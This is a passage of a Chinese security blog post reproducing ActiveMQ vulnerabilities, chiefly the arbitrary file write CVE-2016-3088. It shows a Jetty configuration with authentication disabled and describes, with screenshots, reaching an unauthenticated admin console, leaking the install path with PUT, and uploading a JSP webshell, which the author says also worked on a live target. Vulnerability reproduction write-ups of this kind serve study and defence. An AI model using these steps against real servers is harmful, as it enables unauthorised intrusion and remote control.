or</span></span><br><span class="line"><span class="comment">        implied. See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment">        limitations under the License.</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        An embedded servlet engine for serving up the Admin consoles, REST and Ajax APIs and</span></span><br><span class="line"><span class="comment">        some demos Include this file in your configuration to enable ActiveMQ web components</span></span><br><span class="line"><span class="comment">        e.g. &lt;import resource="jetty.xml"/&gt;</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"securityLoginService"</span> <span class="attr">class</span>=<span class="string">"org.eclipse.jetty.security.HashLoginService"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"ActiveMQRealm"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"config"</span> <span class="attr">value</span>=<span class="string">"$&#123;activemq.conf&#125;/jetty-realm.properties"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"securityConstraint"</span> <span class="attr">class</span>=<span class="string">"org.eclipse.jetty.util.security.Constraint"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"BASIC"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"roles"</span> <span class="attr">value</span>=<span class="string">"admin"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"authenticate"</span> <span class="attr">value</span>=<span class="string">"false"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"securityConstraintMapping"</span> <span class="attr">class</span>=<span class="string">"org.eclipse.jetty.security.ConstraintMapping"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"constraint"</span> <span class="attr">ref</span>=<span class="string">"securityConstraint"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"pathSpec"</span> <span class="attr">value</span>=<span class="string">"/*"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"securityHandler"</span> <span class="attr">class</span>=<span class="string">"org.eclipse.jetty.security.ConstraintSecurityHandler"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"loginService"</span> <span class="attr">ref</span>=<span class="string">"securityLoginService"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"authenticator"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.eclipse.jetty.security.authentication.BasicAuthenticator"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"constraintMappings"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">"securityConstraintMapping"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"handler"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"sec"</span> <span class="attr">class</span>=<span class="string">"org.eclipse.jetty.server.handler.HandlerCollection"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"handlers"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.eclipse.jetty.webapp.WebAppContext"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"contextPath"</span> <span class="attr">value</span>=<span class="string">"/admin"</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"resourceBase"</span> <span class="attr">value</span>=<span class="string">"$&#123;activemq.home&#125;/webapps/admin"</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"logUrlOnStart"</span> <span class="attr">value</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.eclipse.jetty.webapp.WebAppContext"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"contextPath"</span> <span class="attr">value</span>=<span class="string">"/demo"</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"resourceBase"</span> <span class="attr">value</span>=<span class="string">"$&#123;activemq.home&#125;/webapps/demo"</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"logUrlOnStart"</span> <span class="attr">value</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.eclipse.jetty.webapp.WebAppContext"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"contextPath"</span> <span class="attr">value</span>=<span class="string">"/fileserver"</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"resourceBase"</span> <span class="attr">value</span>=<span class="string">"$&#123;activemq.home&#125;/webapps/fileserver"</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"logUrlOnStart"</span> <span class="attr">value</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"parentLoaderPriority"</span> <span class="attr">value</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.eclipse.jetty.server.handler.ResourceHandler"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"directoriesListed"</span> <span class="attr">value</span>=<span class="string">"false"</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"welcomeFiles"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">value</span>&gt;</span>index.html<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"resourceBase"</span> <span class="attr">value</span>=<span class="string">"$&#123;activemq.home&#125;/webapps/"</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"defaultHandler"</span> <span class="attr">class</span>=<span class="string">"org.eclipse.jetty.server.handler.DefaultHandler"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"serveIcon"</span> <span class="attr">value</span>=<span class="string">"false"</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"contexts"</span> <span class="attr">class</span>=<span class="string">"org.eclipse.jetty.server.handler.ContextHandlerCollection"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"Server"</span> <span class="attr">class</span>=<span class="string">"org.eclipse.jetty.server.Server"</span> <span class="attr">init-method</span>=<span class="string">"start"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">destroy-method</span>=<span class="string">"stop"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"connectors"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"Connector"</span> <span class="attr">class</span>=<span class="string">"org.eclipse.jetty.server.nio.SelectChannelConnector"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"port"</span> <span class="attr">value</span>=<span class="string">"8161"</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">                    Enable this connector if you wish to use https with web console</span></span><br><span class="line"><span class="comment">                --&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">                &lt;bean id="SecureConnector" class="org.eclipse.jetty.server.ssl.SslSelectChannelConnector"&gt;</span></span><br><span class="line"><span class="comment">                    &lt;property name="port" value="8162" /&gt;</span></span><br><span class="line"><span class="comment">                    &lt;property name="keystore" value="file:$&#123;activemq.conf&#125;/broker.ks" /&gt;</span></span><br><span class="line"><span class="comment">                    &lt;property name="password" value="password" /&gt;</span></span><br><span class="line"><span class="comment">                &lt;/bean&gt;</span></span><br><span class="line"><span class="comment">                --&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"handler"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"handlers"</span> <span class="attr">class</span>=<span class="string">"org.eclipse.jetty.server.handler.HandlerCollection"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"handlers"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">"contexts"</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">"securityHandler"</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="实战复现"><a href="#实战复现" class="headerlink" title="实战复现"></a>实战复现</h2><blockquote>
+<p>在一次任务中碰见一个activemq的页面，版本比较低为5.4，winserver2008的环境，所以拿下目标只能寄希望在写shell了，由于版本低，身份认证默认是关闭的，同时又存在任意文件写入漏洞，所以运气好拿下shell。本地以win+5.7的环境复现一下</p>
+</blockquote>
+<h3 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h3><p>在bin目录下启动activemq.bat</p>
+<h3 id="访问环境"><a href="#访问环境" class="headerlink" title="访问环境"></a>访问环境</h3><p><a href="http://192.168.1.102:8161/admin/" target="_blank" rel="noopener">http://192.168.1.102:8161/admin/</a> 没有进行身份认证</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573227616.67.png" alt></p>
+<h3 id="探测绝对路径"><a href="#探测绝对路径" class="headerlink" title="探测绝对路径"></a>探测绝对路径</h3><p><a href="http://192.168.1.102:8161/admin/test/systemProperties.jsp" target="_blank" rel="noopener">http://192.168.1.102:8161/admin/test/systemProperties.jsp</a>  访问发现不存在</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573227713.07.png" alt></p>
+<p>利用此版本PUT方法爆绝对路径<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573227889.76.png" alt></p>
+<h3 id="传shell"><a href="#传shell" class="headerlink" title="传shell"></a>传shell</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573227957.58.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573228065.83.png" alt></p>
+<p>用冰蝎连接的时候获取不了密码，和实战时一如既往的翻车，实战中传了jspx的马成功连接，此处jspx也没有连接成功，传别的jsp直接访问即可。</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573228512.05.png" alt></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总体来说，getshell的条件比较苛刻，实际中成功是我运气好，emm…</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/yuzly/p/11278131.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/p/11278131.html</a></p>
+<p><a href="https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2016-3088/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2016-3088/README.zh-cn.md</a></p>
+<p><a href="https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2015-5254/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2015-5254/README.zh-cn.md</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    Demos
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://www.lsowl.top/2019/11/09/ActiveMQ系列漏洞复现总结/" title="ActiveMQ系列漏洞复现总结">https://www.lsowl.top/2019/11/09/ActiveMQ系列漏洞复现总结/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/漏洞复现/" rel="tag"><i class="fa fa-tag"></i> 漏洞复现</a>
+          
+            <a href="/tags/ActiveMQ/" rel="tag"><i class="fa fa-tag"></i> ActiveMQ</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/28/clickjack/" rel="next" title="clickjack">
+                <i class="fa fa-chevron-left"></i> clickjack
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Demos">
+            
+              <p class="site-author-name" itemprop="name">Demos</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">39</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">51</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/demossl" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:demosqq@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.shentoushi.top/" title="渗透师导航" target="_blank">渗透师导航</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://damit5.com" title="Damit5" target="_blank">Damit5</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://adad456.github.io" title="拾柒" target="_blank">拾柒</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ActiveMQ介绍"><span class="nav-number">1.</span> <span class="nav-text">ActiveMQ介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ActiveMQ-反序列化漏洞（CVE-2015-5254）"><span class="nav-number">2.</span> <span class="nav-text">ActiveMQ 反序列化漏洞（CVE-2015-5254）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#运行环境"><span class="nav-number">2.1.</span> <span class="nav-text">运行环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞复现"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞复现</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><span class="nav-number">3.</span> <span class="nav-text">ActiveMQ任意文件写入漏洞（CVE-2016-3088）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#背景简述"><span class="nav-number">3.1.</span> <span class="nav-text">背景简述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞详情"><span class="nav-number">3.2.</span> <span class="nav-text">漏洞详情</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#写入webshell"><span class="nav-number">3.3.</span> <span class="nav-text">写入webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#写入计划任务，自动化弹shell-要求active必须时root权限运行的"><span class="nav-number">3.4.</span> <span class="nav-text">写入计划任务，自动化弹shell(要求active必须时root权限运行的)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#写入jetty-xml或jar"><span class="nav-number">3.5.</span> <span class="nav-text">写入jetty.xml或jar</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实战复现"><span class="nav-number">4.</span> <span class="nav-text">实战复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#启动环境"><span class="nav-number">4.1.</span> <span class="nav-text">启动环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#访问环境"><span class="nav-number">4.2.</span> <span class="nav-text">访问环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#探测绝对路径"><span class="nav-number">4.3.</span> <span class="nav-text">探测绝对路径</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#传shell"><span class="nav-number">4.4.</span> <span class="nav-text">传shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Demos</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">82.6k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共82.6k字</span>
+</div>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
